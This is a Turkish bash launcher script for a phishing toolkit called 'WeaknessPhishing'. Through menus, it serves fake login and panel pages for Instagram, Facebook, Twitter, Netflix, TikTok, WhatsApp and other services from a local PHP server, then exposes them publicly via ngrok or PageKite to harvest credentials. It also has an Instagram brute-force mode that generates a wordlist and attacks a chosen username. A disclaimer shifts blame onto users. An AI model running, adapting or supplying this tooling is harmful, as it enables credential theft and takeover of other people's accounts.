#!/bin/bash                                     #Code : Weakness.py
#
#İnstagram : @Weakness.py                     #Bu toolun kullanımında meydana gelicek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!
#WeaknessPhishing
banner_sm(){

        clear
        echo -e "\033[31;40;1m
                   \e[36m          Sosyal Medya                 
                   \e[32m*******************************
                        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
                        █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                        █░░║║║╠─║─║─║║║║║╠─░░█
                        █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
                        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
                   \e[31m[\e[32m01\e[31m]\e[37mİnstagram        \e[31m[\e[32m02\e[31m]\e[37mFacebook
                   \e[31m[\e[32m03\e[31m]\e[37mTwitter          \e[31m[\e[32m04\e[31m]\e[37mYoutube
                   \e[31m[\e[32m05\e[31m]\e[37mWhatsapp         \e[31m[\e[32m06\e[31m]\e[37mSpofity
                   \e[31m[\e[32m07\e[31m]\e[37mNetflix          \e[31m[\e[32m08\e[31m]\e[37mBlu Tv
                   \e[31m[\e[32m09\e[31m]\e[37mTikTok           \e[31m[\e[32m10\e[31m]\e[37mTwitch
                   \e[34m*******************************
                   \e[31m[\e[32m99\e[31m]\e[37mAna Menü
                        "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_sm

}

banner_pagekite_mail(){
        clear
        echo -e "
\e[31m[\e[32m01\e[31m]\e[37mNgrok
\e[31m[\e[32m02\e[31m]\e[37mPageKite
                   "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_page
}


banner_instagram(){

        clear
        echo -e "\033[31;40;1m
                   \e[36m          İnstagram
                   \e[32m*******************************
                        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
                        █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                        █░░║║║╠─║─║─║║║║║╠─░░█
                        █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
                        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
                   \e[31m[\e[32m01\e[31m]\e[37mİnstagram Login
                   \e[31m[\e[32m02\e[31m]\e[37mİnstagram Panel
                   \e[31m[\e[32m03\e[31m]\e[37mİnstagram-Brute

                   \e[31m[\e[32m99\e[31m]\e[37mBir Önceki Menü
                        "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_instagram
}

banner_instagram_brute(){

        clear
        echo -e "\033[31;40;1m
                   \e[36m      İnstagram-BruteForce
                   \e[32m*******************************
                        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
                        █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                        █░░║║║╠─║─║─║║║║║╠─░░█
                        █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
                        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
                   \e[31m[\e[32m01\e[31m]\e[37mWordlist Oluştur
                   \e[31m[\e[32m02\e[31m]\e[37mAtağı Başlat

                   \e[31m[\e[32m99\e[31m]\e[37mBir Önceki Ana Menü
                        "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_instagram_brute
}


banner_facebook(){

        clear
        echo -e "\033[31;40;1m
                   \e[36m            Facebook
                   \e[32m*******************************
                        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
                        █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                        █░░║║║╠─║─║─║║║║║╠─░░█
                        █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
                        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
                   \e[31m[\e[32m01\e[31m]\e[37mFacebook Login
                   \e[31m[\e[32m02\e[31m]\e[37mFacebook Panel

                   \e[31m[\e[32m99\e[31m]\e[37mBir Önceki Ana Menü
                        "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_facebook
}


banner_twitter(){

        clear
        echo -e "\033[31;40;1m
                   \e[36m            Twitter
                   \e[32m*******************************
                        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
                        █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                        █░░║║║╠─║─║─║║║║║╠─░░█
                        █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
                        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
                   \e[31m[\e[32m01\e[31m]\e[37mTwitter Login
                   \e[31m[\e[32m02\e[31m]\e[37mTwitter Panel

                   \e[31m[\e[32m99\e[31m]\e[37mBir Önceki Ana Menü
                        "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_t
}


don () {
while [ false ]; do
if [[ 'yaman' == 'efkar' ]]; then
cat  gmail/kayit.txt
fi
sleep 1
done
}
random="yaman"$RANDOM
banner_sm






#-------------------------------Menü 1--------------------------------
if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then

        banner_instagram


#-------------------------------Menü 1 / 1--------------------------------
        if [[ $islem_instagram == 1 || $islem_instagram == 01 ]]; then
                banner_pagekite_mail
                if [[ $islem_page == 01  ]]; then
                        echo ""
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                        sleep 1
                        cd instagram-login/ &&
                        php -S 127.0.0.1:$port > /dev/null 2>&1 &
                        sleep 2
                        ngrok http $port > /dev/null 2>&1 &
                        sleep 10
                        link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                        echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                        don
                elif [[ $islem_page == 02 ]]; then
                        clear
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                        echo ""
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                        sleep 1
                        cd instagram-login/ &&
                        php -S 127.0.0.1:$port > /dev/null 2>&1 &
                        sleep 2
                        python2 pagekite.py --clean $port $domain.pagekite.me
                        else
                                echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                sleep 2
                                bash sm.sh
                        fi


#-------------------------------Menü 1 / 2--------------------------------
        elif [[ $islem_instagram == 2 || $islem_instagram == 02 ]]; then
                banner_pagekite_mail
                if [[ $islem_page == 01  ]]; then
                        echo ""
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                        sleep 1
                        cd instagram-panel/ &&
                        php -S 127.0.0.1:$port > /dev/null 2>&1 &
                        sleep 2
                        ngrok http $port > /dev/null 2>&1 &
                        sleep 10
                        link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                        echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                        don
                elif [[ $islem_page == 02 ]]; then
                        clear
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                        echo ""
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                        sleep 1
                        cd instagram-panel/ &&
                        php -S 127.0.0.1:$port > /dev/null 2>&1 &
                        sleep 2
                        python2 pagekite.py --clean $port $domain.pagekite.me
                        else
                                echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                sleep 2
                                bash sm.sh
                        fi




#-------------------------------Menu 1 / 3--------------------------------

        elif [[ $islem_instagram == 3 || $islem_instagram == 03 ]]; then
                banner_instagram_brute
                if [[ $islem_instagram_brute == 1 || $islem_instagram_brute == 01 ]]; then
                        if [[ -e "instagram-bruteforce/wordlist.txt" ]]; then
                                echo -e '\033[31;40;1mDaha önce oluşturulmuş bir wordlistiniz bulunmakta...'
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mYeni wordlist oluşturmak ister misiniz ? [E / H] : ' insta_brute
                                        if [[ $insta_brute == "E" || $insta_brute == "e" ]]; then
                                               read -p $'\e[31m[\e[32m!\e[31m]\e[37mMaximum karakter uzunluğu : ' max
                                               echo -e ""
                                               read -p $'\e[31m[\e[32m!\e[31m]\e[37mMinimum karakter uzunluğu : ' min
                                               echo -e ""
                                               read -p $'\e[31m[\e[32m!\e[31m]\e[37mKaristirilcak metinler ve saylar (a-z ,0-9) : ' char
                                               echo -e '\033[31;40;1mWordlistiniz oluşturuluyor.....'
                                               cd instagram-bruteforce/ &&
                                               wordlist -m $min -M $max -o wordlist.txt $char
                                               clear
                                               echo -e '\033[31;40;1mWordlist oluşturuldu!'
                                               sleep 1
                                        else
                                        clear
                                        echo -e '\033[31;40;1mHayır dediniz! Eski wordlisti kullanmaya devam edilicek.'
                                        sleep 2
                                        banner_instagram_brute
                                        fi
                        else
                                               read -p $'\e[31m[\e[32m!\e[31m]\e[37mMaximum karakter uzunluğu : ' max
                                               echo -e ""
                                               read -p $'\e[31m[\e[32m!\e[31m]\e[37mMinimum karakter uzunluğu : ' min
                                               echo -e ""
                                               read -p $'\e[31m[\e[32m!\e[31m]\e[37mKaristirilcak metinler ve saylar (a-z ,0-9) : ' char
                                               echo -e '\033[31;40;1mWordlistiniz oluşturuluyor.....'
                                               cd instagram-bruteforce/ &&
                                               wordlist -m $min -M $max -o wordlist.txt $char
                                               clear
                                               echo -e '\033[31;40;1mWordlist oluşturuldu!'
                                               sleep 2
                                               cd .. && bash sm.sh

                        fi
                elif [[ $islem_instagram_brute == 2 || $islem_instagram_brute == 02 ]]; then
                read -p $'\e[31m[\e[32m!\e[31m]\e[37mHedef Kullanıcı Adı : ' username
                cd instagram-bruteforce/ &&
                python3 instagram.py $username wordlist.txt -m 3
                elif [[ $islem_instagram_brute == 9 || $islem_instagram_brute == 99 ]]; then
                        bash sm.sh
                else
                echo -e '\033[31;40;1mİslem Numaranızı Kontrol Ediniz!'
                sleep 2
                clear
                bash sm.sh
                fi
        elif [[ $islem_instagram == 9 || $islem_instagram == 99 ]]; then
                bash sm.sh
        else
                echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                sleep 2
                bash sm.sh
        fi

#//////////////////////////////////////////////////////////////////////////////
#//////////////////////////////////////////////////////////////////////////////
#//////////////////////////////////////////////////////////////////////////////


#-------------------------------Menü 2 / 1--------------------------------


        elif [[ $islem_sm == 2 || $islem_sm == 02 ]]; then
                banner_facebook
                if [[ $islem_facebook == 1 || $islem_facebook == 01 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd facebook-login/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd facebook-login/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me

                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi


#-------------------------------Menü 2 / 2--------------------------------




                elif [[ $islem_facebook == 2 || $islem_facebook == 02 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd facebook-panel/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd facebook-panel/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi


#-------------------------------Facebook AnaSayfa--------------------------------





                elif [[ $islem_facebook == 9 || $islem_facebook == 99 ]]; then
                        bash sm.sh
#-------------------------------Facebook Error--------------------------------
                else
                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                        sleep 2
                        bash sm.sh
                fi



#////////////////////////////////////////////////////////////////////////////////////




#-------------------------------Menu 3--------------------------------


        elif [[ $islem_sm == 3 || $islem_sm == 03 ]]; then
                banner_twitter
#-------------------------------Menu 3 / 1 --------------------------------
                        if [[ $islem_t == 1 || $islem_t == 01 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd twitter-login/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd twitter-login/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi


#-------------------------------Menu 3 / 2--------------------------------

                        elif [[ $islem_t == 2 || $islem_t == 02 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd twitter-panel/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd twitter-panel/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi


                        elif [[ $islem_t == 9 || $islem_t == 99 ]]; then
                                bash sm.sh
                        else
                                echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                sleep 2
                                bash sm.sh

                        fi


#-------------------------------Menu 4--------------------------------
        elif [[ $islem_sm == 4 || $islem_sm == 04 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd youtube/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd youtube/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi





#-------------------------------Menu 5--------------------------------

        elif [[ $islem_sm == 5 || $islem_sm == 05 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd whatsapp/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd whatsapp/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi




#-------------------------------Menu 6--------------------------------
        elif [[ $islem_sm == 6 || $islem_sm == 06 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd spofity/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd spofity/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi


#-------------------------------Menu 7--------------------------------
        elif [[ $islem_sm == 7 || $islem_sm == 07 ]]; then
                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd netflix/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd netflix/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi



#-------------------------------Menu 8--------------------------------
        elif [[ $islem_sm == 8 || $islem_sm == 08 ]]; then

                        banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd blutv/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd blutv/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi




#-------------------------------Menu 9--------------------------------
        elif [[ $islem_sm == 9 || $islem_sm == 09 ]]; then
                                banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd tiktok/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd tiktok/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi


#-------------------------------Menu 10--------------------------------
        elif [[ $islem_sm == 10 ]]; then
                                banner_pagekite_mail
                        if [[ $islem_page == 01  ]]; then
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
                                sleep 1
                                cd twitch/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                ngrok http $port > /dev/null 2>&1 &
                                sleep 10
                                link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
                                echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
                                don
                        elif [[ $islem_page == 02 ]]; then
                                clear
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mDomain Adı : ' domain
                                echo ""
                                read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
                                sleep 1
                                cd twitch/ &&
                                php -S 127.0.0.1:$port > /dev/null 2>&1 &
                                sleep 2
                                python2 pagekite.py --clean $port $domain.pagekite.me
                                else
                                        echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                        sleep 2
                                        bash sm.sh
                                fi


#-------------------------------AnaSayfa--------------------------------
        elif [[ $islem_sm == 9 || $islem_sm == 99 ]]; then
                bash weaknesspyphishing.sh

#-------------------------------Error--------------------------------
        else
                echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                sleep 2
                bash sm.sh
	fi
